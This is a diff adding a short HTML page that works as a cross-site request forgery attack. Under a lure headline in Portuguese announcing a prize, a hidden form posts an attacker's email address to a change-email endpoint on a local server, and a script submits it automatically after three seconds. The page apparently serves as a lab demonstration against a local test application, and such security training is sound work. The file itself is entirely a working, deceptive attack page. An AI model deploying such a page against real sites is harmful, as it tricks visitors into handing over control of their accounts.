@@ -1,0 +1,17 @@
+<html>
+<body>
+
+  <h1>🎁 Você ganhou um prêmio!</h1>
+
+  <form action="http://127.0.0.1:5000/change-email" method="POST" id="csrf-form">
+    <input type="hidden" name="new_email" value="hacker@email.com">
+  </form>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById("csrf-form").submit();
+    }, 3000);
+  </script>
+
+</body>
+</html>
